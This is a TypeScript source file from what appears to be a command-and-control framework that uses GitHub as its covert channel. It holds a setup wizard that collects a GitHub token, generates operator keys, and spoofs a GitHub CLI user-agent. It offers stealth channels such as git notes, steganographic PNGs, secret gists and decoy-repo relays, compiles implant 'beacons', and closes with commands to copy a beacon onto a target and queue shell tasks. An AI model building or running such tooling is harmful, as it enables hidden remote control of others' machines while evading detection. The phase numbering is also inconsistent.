// octoctl/src/commands/setup/phases.ts
import * as p from "@clack/prompts";
import { Octokit } from "@octokit/rest";
import { generateOperatorKeyPair, bytesToBase64 } from "../../lib/crypto.ts";
import { checkRepo } from "./validate.ts";
import {
  wizardIntro, wizardOutro, sectionHeader, withSpinner,
  promptPassword, promptText, promptSelect, promptConfirm, maskToken,
} from "./prompts.ts";

const DIM   = "\x1b[2m";
const BOLD  = "\x1b[1m";
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const RED   = "\x1b[31m";
const YELLOW = "\x1b[33m";

export interface SetupState {
  token: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  authMode: "pat" | "app";
  appId?: number;
  installationId?: number;
  tentaclePriority?: string;
  envPath?: string;
}

export async function phaseCredentials(): Promise<{
  token: string;
  owner: string;
  repo: string;
}> {
  sectionHeader("Phase 1 / 8 — GitHub Credentials");

  const token = await promptPassword({
    message: "GitHub PAT (repo scope minimum)",
    validate: (v) => {
      if (!v.trim()) return "Token is required";
      if (!v.startsWith("ghp_") && !v.startsWith("github_pat_"))
        return "Expected a GitHub PAT (ghp_… or github_pat_…)";
    },
  });

  p.log.info(`Token: ${maskToken(token)}`);

  const owner = await promptText({
    message: "C2 repo owner (org or username)",
    placeholder: "myorg",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const repo = await promptText({
    message: "C2 repo name",
    placeholder: "infrastructure",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  return { token: token.trim(), owner: owner.trim(), repo: repo.trim() };
}

export async function phaseValidate(
  token: string,
  owner: string,
  repo: string,
): Promise<void> {
  sectionHeader("Phase 2 / 8 — Validating GitHub Access");

  const result = await withSpinner(
    `Checking ${owner}/${repo}…`,
    () => checkRepo(token, owner, repo),
  );

  if (result.error) {
    p.log.error(`${RED}${result.error}${RESET}`);
    const retry = await promptConfirm({ message: "Re-enter credentials?", initialValue: true });
    if (retry) throw new Error("RETRY_CREDENTIALS");
    process.exit(1);
  }

  const hasRepo = result.scopes.includes("repo");
  if (!hasRepo) {
    p.log.warn(`${YELLOW}PAT is missing 'repo' scope — most tentacles will fail.${RESET}`);
  } else {
    p.log.success(`PAT scopes: ${result.scopes.join(", ")}`);
  }

  if (!result.private) {
    p.log.warn(`${YELLOW}${owner}/${repo} is PUBLIC — strongly recommend making it private.${RESET}`);
    const proceed = await promptConfirm({ message: "Continue anyway?", initialValue: false });
    if (!proceed) process.exit(0);
  } else {
    p.log.success(`${owner}/${repo} is private`);
  }

  if (!result.hasIssues) {
    p.log.warn(`${YELLOW}Issues are disabled on ${owner}/${repo}. The issues tentacle won't work.${RESET}`);
  } else {
    p.log.success("Issues are enabled");
  }
}

export async function phaseKeygen(
  token: string,
  owner: string,
  repo: string,
): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
  sectionHeader("Phase 3 / 8 — Operator Keypair");

  const existingSecret = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
  if (existingSecret) {
    const reuse = await promptConfirm({
      message: "Existing OCTOC2_OPERATOR_SECRET detected. Reuse it?",
      initialValue: true,
    });
    if (reuse) {
      p.log.info("Reusing existing operator keypair.");
      return { operatorSecret: existingSecret, operatorPublicKey: "(existing — check MONITORING_PUBKEY)" };
    }
  }

  const kp = await withSpinner("Generating X25519 keypair…", async () => {
    const keys = await generateOperatorKeyPair();
    return {
      secret: await bytesToBase64(keys.secretKey),
      public: await bytesToBase64(keys.publicKey),
    };
  });

  p.log.info(`Public key:  ${kp.public}`);
  p.log.info(`Secret key:  ${DIM}(will be written to .env)${RESET}`);

  const pushVar = await promptConfirm({
    message: `Push public key to MONITORING_PUBKEY variable on ${owner}/${repo}?`,
    initialValue: true,
  });

  if (pushVar) {
    await withSpinner("Setting MONITORING_PUBKEY…", async () => {
      const octokit = new Octokit({
        auth: token,
        headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
      });
      try {
        await octokit.request("POST /repos/{owner}/{repo}/actions/variables", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      } catch {
        await octokit.request("PATCH /repos/{owner}/{repo}/actions/variables/{name}", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      }
    });
  }

  return { operatorSecret: kp.secret, operatorPublicKey: kp.public };
}

export async function phaseAuthMode(): Promise<{
  authMode: "pat" | "app";
  appId?: number;
  installationId?: number;
}> {
  sectionHeader("Phase 4 / 8 — Authentication Mode");

  const mode = await promptSelect<"pat" | "app">({
    message: "How should the beacon authenticate?",
    options: [
      { value: "pat", label: "PAT only", hint: "simpler — static token baked into binary" },
      { value: "app", label: "GitHub App", hint: "recommended — rotating 1-hour tokens, key delivered via dead-drop" },
    ],
  });

  if (mode === "pat") return { authMode: "pat" };

  const appIdStr = await promptText({
    message: "GitHub App ID (numeric)",
    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
  });

  const installIdStr = await promptText({
    message: "Installation ID (from app install URL)",
    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
  });

  p.log.info(`${DIM}Private key is never baked — deliver via: octoctl drop create --app-key-file <pem>${RESET}`);

  return {
    authMode: "app",
    appId: parseInt(appIdStr, 10),
    installationId: parseInt(installIdStr, 10),
  };
}

export async function phaseTentacles(): Promise<string | undefined> {
  sectionHeader("Phase 5 / 8 — Tentacle Priority");

  const mode = await promptSelect<"auto" | "custom">({
    message: "How should the beacon choose communication channels?",
    options: [
      { value: "auto", label: "Auto-detect", hint: "stealth-first ordering based on available env vars" },
      { value: "custom", label: "Custom priority", hint: "choose exactly which channels and in what order" },
    ],
  });

  if (mode === "auto") return undefined;

  const channels = await p.multiselect({
    message: "Select tentacles (order = priority, top = first tried)",
    options: [
      { value: "notes",    label: "Notes",         hint: "refs/notes — invisible to most GitHub UI" },
      { value: "stego",    label: "Steganography",  hint: "LSB-encoded PNG blobs in branches" },
      { value: "gist",     label: "Gist",           hint: "secret gists — not visible in repo" },
      { value: "branch",   label: "Branch",         hint: "file dead-drops on infra-sync branches" },
      { value: "actions",  label: "Actions",        hint: "Variables API — only works inside GH Actions" },
      { value: "secrets",  label: "Secrets",        hint: "Variables API ACK — out-of-band config" },
      { value: "proxy",    label: "OctoProxy",      hint: "relay through decoy repos" },
      { value: "issues",   label: "Issues",         hint: "encrypted issue comments — always available" },
    ],
  });

  if (p.isCancel(channels)) {
    p.cancel("Setup cancelled.");
    process.exit(0);
  }

  return (channels as string[]).join(",");
}

export interface EnvFileInput {
  token: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  appId?: number;
  installationId?: number;
  tentaclePriority?: string;
}

export function generateEnvFile(input: EnvFileInput): string {
  const lines: string[] = [
    `# OctoC2 environment — generated by octoctl setup`,
    `# ${new Date().toISOString().slice(0, 10)}`,
    ``,
    `# ── C2 repo ─────────────────────────────────────────────────────────────────`,
    `OCTOC2_GITHUB_TOKEN=${input.token}`,
    `OCTOC2_REPO_OWNER=${input.owner}`,
    `OCTOC2_REPO_NAME=${input.repo}`,
    ``,
    `# ── Operator keypair ────────────────────────────────────────────────────────`,
    `OCTOC2_OPERATOR_SECRET=${input.operatorSecret}`,
    `# MONITORING_PUBKEY=${input.operatorPublicKey}`,
  ];

  if (input.appId !== undefined || input.installationId !== undefined) {
    lines.push(``);
    lines.push(`# ── GitHub App ──────────────────────────────────────────────────────────────`);
    if (input.appId !== undefined) lines.push(`SVC_APP_ID=${input.appId}`);
    if (input.installationId !== undefined) lines.push(`SVC_INSTALLATION_ID=${input.installationId}`);
    lines.push(`# Private key delivered via dead-drop (never baked)`);
  }

  if (input.tentaclePriority) {
    lines.push(``);
    lines.push(`# ── Tentacle priority ───────────────────────────────────────────────────────`);
    lines.push(`SVC_TENTACLE_PRIORITY=${input.tentaclePriority}`);
  }

  lines.push(``);
  return lines.join("\n");
}

export async function phaseWriteEnv(state: SetupState): Promise<string> {
  sectionHeader("Phase 6 / 8 — Write .env File");

  const envPath = await promptText({
    message: "Where should the .env file be written?",
    initialValue: ".env",
    placeholder: ".env",
  });

  const content = generateEnvFile(state);

  const { existsSync } = await import("node:fs");
  if (existsSync(envPath)) {
    const overwrite = await promptConfirm({
      message: `${envPath} already exists. Overwrite?`,
      initialValue: false,
    });
    if (!overwrite) {
      p.log.info("Skipped — .env not written.");
      return envPath;
    }
  }

  await Bun.write(envPath, content);
  p.log.success(`Written to ${envPath}`);
  return envPath;
}

export async function phaseBuildBeacon(state: SetupState): Promise<void> {
  sectionHeader("Phase 7 / 8 — Build Beacon");

  const build = await promptConfirm({
    message: "Build a beacon binary now?",
    initialValue: true,
  });

  if (!build) {
    p.log.info(`${DIM}Skipped. Build later with: octoctl build-beacon --outfile ./beacon${RESET}`);
    return;
  }

  const target = await promptSelect<string>({
    message: "Target platform",
    options: [
      { value: "bun-linux-x64",    label: "Linux x64" },
      { value: "bun-linux-arm64",  label: "Linux ARM64" },
      { value: "bun-windows-x64",  label: "Windows x64" },
      { value: "bun-darwin-arm64", label: "macOS ARM64 (Apple Silicon)" },
      { value: "bun-darwin-x64",   label: "macOS x64 (Intel)" },
    ],
  });

  const outfile = await promptText({
    message: "Output path",
    initialValue: "./beacon",
    placeholder: "./beacon",
  });

  const args = [
    "run", "octoctl/src/index.ts", "build-beacon",
    "--outfile", outfile,
    "--target", target,
  ];
  if (state.tentaclePriority) {
    args.push("--tentacle-priority", state.tentaclePriority);
  }
  if (state.appId !== undefined) {
    args.push("--app-id", String(state.appId));
  }
  if (state.installationId !== undefined) {
    args.push("--installation-id", String(state.installationId));
  }

  await withSpinner("Compiling beacon…", async () => {
    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
    const proc = Bun.spawn([bunBin, ...args], {
      stdout: "pipe",
      stderr: "pipe",
      env: {
        ...process.env,
        OCTOC2_GITHUB_TOKEN: state.token,
        OCTOC2_REPO_OWNER: state.owner,
        OCTOC2_REPO_NAME: state.repo,
      },
    });
    const code = await proc.exited;
    if (code !== 0) throw new Error(`Build failed (exit ${code})`);
  });

  p.log.success(`Beacon built: ${outfile}`);
}

// ── Phase 8: Install to PATH ─────────────────────────────────────────────────

export async function phaseInstall(): Promise<void> {
  sectionHeader("Phase 8 / 9 — Install octoctl to PATH");

  const install = await promptConfirm({
    message: "Install octoctl to /usr/local/bin so you can run it from anywhere?",
    initialValue: true,
  });

  if (!install) {
    p.log.info(`${DIM}Skipped. Run manually with: bun run octoctl/src/index.ts <command>${RESET}`);
    return;
  }

  const projectRoot = process.cwd().replace(/\/octoctl$/, "");
  const scriptContent = `#!/bin/sh\nexec bun "${projectRoot}/octoctl/src/index.ts" "$@"\n`;
  const targetPath = "/usr/local/bin/octoctl";

  try {
    const { writeFileSync, chmodSync } = await import("node:fs");
    writeFileSync(targetPath, scriptContent, { mode: 0o755 });
    chmodSync(targetPath, 0o755);
    p.log.success(`Installed to ${targetPath}`);
  } catch (err) {
    // Likely permission denied — try with sudo
    p.log.warn(`${YELLOW}Direct write failed — trying with sudo…${RESET}`);
    const tmpPath = `/tmp/octoctl-install-${Date.now()}`;
    const { writeFileSync } = await import("node:fs");
    writeFileSync(tmpPath, scriptContent, { mode: 0o755 });

    const proc = Bun.spawn(["sudo", "cp", tmpPath, targetPath], {
      stdout: "inherit",
      stderr: "inherit",
    });
    const code = await proc.exited;
    if (code === 0) {
      Bun.spawn(["sudo", "chmod", "+x", targetPath], { stdout: "pipe", stderr: "pipe" });
      p.log.success(`Installed to ${targetPath} (via sudo)`);
    } else {
      p.log.error(`${RED}Failed to install. You can do it manually:${RESET}`);
      p.log.info(`echo '${scriptContent.replace(/\n/g, "\\n")}' | sudo tee ${targetPath} && sudo chmod +x ${targetPath}`);
    }

    try { (await import("node:fs")).unlinkSync(tmpPath); } catch {}
  }
}

// ── Phase 9: Verify ──────────────────────────────────────────────────────────

export async function phaseVerify(state: SetupState): Promise<void> {
  sectionHeader("Phase 9 / 9 — Next Steps");

  p.log.message(`
  ${BOLD}Your deployment is configured.${RESET}

  ${DIM}1.${RESET} Start everything:    ${GREEN}octoctl start${RESET}
  ${DIM}2.${RESET} Deploy the beacon:   ${GREEN}scp ./beacon target:/tmp/ && ssh target '/tmp/beacon &'${RESET}
  ${DIM}3.${RESET} Check registration:  ${GREEN}octoctl beacons${RESET}  ${DIM}(wait ~60s)${RESET}
  ${DIM}4.${RESET} Queue first task:    ${GREEN}octoctl task <id> --kind shell --cmd "id"${RESET}
  ${DIM}5.${RESET} Read results:        ${GREEN}octoctl results <id>${RESET}
  ${DIM}6.${RESET} Check status:        ${GREEN}octoctl status${RESET}
  ${DIM}7.${RESET} Stop everything:     ${GREEN}octoctl stop${RESET}`);

  if (state.authMode === "app") {
    p.log.message(`
  ${BOLD}${YELLOW}GitHub App — deliver private key after first beacon checkin:${RESET}
     ${GREEN}octoctl drop create --beacon <id> --app-key-file <pem>${RESET}`);
  }
}
